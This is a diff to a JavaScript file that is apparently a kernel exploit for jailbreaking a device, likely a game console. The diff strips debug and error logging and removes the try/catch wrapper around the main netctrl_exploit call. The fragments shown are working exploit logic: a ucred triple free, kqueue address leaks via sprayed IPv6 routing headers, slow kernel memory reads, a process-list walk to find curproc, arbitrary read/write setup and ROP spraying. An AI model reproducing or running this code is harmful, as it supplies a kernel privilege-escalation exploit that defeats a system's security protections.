@@ -794,7 +794,6 @@ function cleanup() {
 }
 function fill_buffer_64(buf, val, len) {
   if (!buf || buf.eq(0) || len <= 0) {
-    log('fill_buffer_64: invalid buf/len');
     return;
   }
   for (var i = 0; i < len; i += 8) {
@@ -1018,7 +1017,6 @@ function exploit_phase_rw() {
   setup_arbitrary_rw();
   utils.notify('Jailbreak Success');
   utils.notify('M.ELHOUT');
-  yield_to_render(exploit_phase_jailbreak);
 }
 function exploit_phase_jailbreak() {
   jailbreak();
@@ -1111,12 +1109,10 @@ function find_allproc() {
   var pipe_1 = master_pipe[1];
 
   if (pipe_0 < 0 || pipe_1 < 0) {
-    log('find_allproc: invalid master_pipe fds');
     return new BigInt(0);
   }
 
   debug('find_allproc - Using master_pipe fds: ' + pipe_0 + ', ' + pipe_1);
-  debug('find_allproc - Getting pid...');
   var pid = Number(getpid());
   debug('find_allproc - pid: ' + pid);
 
@@ -1145,7 +1141,6 @@ function find_allproc() {
 
   kernel.addr.curproc = p; // Set global curproc
 
-  debug('find_allproc - Walking process list...');
   var walk_count = 0;
   var mask = new BigInt(0xFFFFFFFF, 0x00000000);
 
@@ -1522,7 +1517,6 @@ function trigger_ucred_triplefree() {
   return true;
 }
 function leak_kqueue() {
-  debug('Leaking ...');
 
   // نحرر triplets[1] عشان نستخدمه في التسريب
   free_rthdr(ipv6_socks[triplets[1]]);
@@ -1567,7 +1561,6 @@ function leak_kqueue() {
   kq_fdp  = read64(leak_rthdr.add(0x98));
 
   if (kq_fdp.eq(0)) {
-    log('Failed to leak kqueue_fdp');
     return false;
   }
 
@@ -1590,10 +1583,8 @@ function leak_kqueue_safe() {
   }
 }
 function kreadslow64(address) {
-  debug('kreadslow64: addr=' + hex(address));
 
   if (address.eq(0)) {
-    log('kreadslow64: invalid address 0');
     return BigInt_Error;
   }
 
@@ -1606,7 +1597,6 @@ function kreadslow64(address) {
 }
 
 function kreadslow64_safe(address) {
-  debug('kreadslow64_safe: addr=' + hex(address));
 
   if (address.eq(0)) {
     return BigInt_Error;
@@ -1614,7 +1604,6 @@ function kreadslow64_safe(address) {
 
   var buffer = kreadslow(address, 8);
   if (buffer.eq(BigInt_Error)) {
-    log('kreadslow64_safe: kreadslow returned BigInt_Error at addr ' + hex(address));
     cleanup();
     throw new Error(' Jailbreak failed - Reboot and try again');
   }
@@ -1637,7 +1626,6 @@ function kreadslow(addr, size) {
   debug('Enter kreadslow addr: ' + hex(addr) + ' size: ' + size);
 
   if (addr.eq(0) || size <= 0) {
-    log('kreadslow: invalid addr/size');
     return BigInt_Error;
   }
 
@@ -1647,7 +1635,6 @@ function kreadslow(addr, size) {
     cleanup();
     return BigInt_Error;
   }
-  debug('kreadslow - Preparing buffers...');
 
   // Prepare leak buffers.
   var leak_buffers = new Array(UIO_THREAD_NUM);
@@ -2374,12 +2361,5 @@ function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_
     loop_size: 0 // loop_size
   };
 }
-try {
-  netctrl_exploit();
-} catch (e) {
-  log('ERROR in netctrl_exploit: ' + e.message);
-  cleanup(true);
-  if (typeof show_fail === 'function') {
-    show_fail();
-  }
-}
+netctrl_exploit();
+// cleanup();
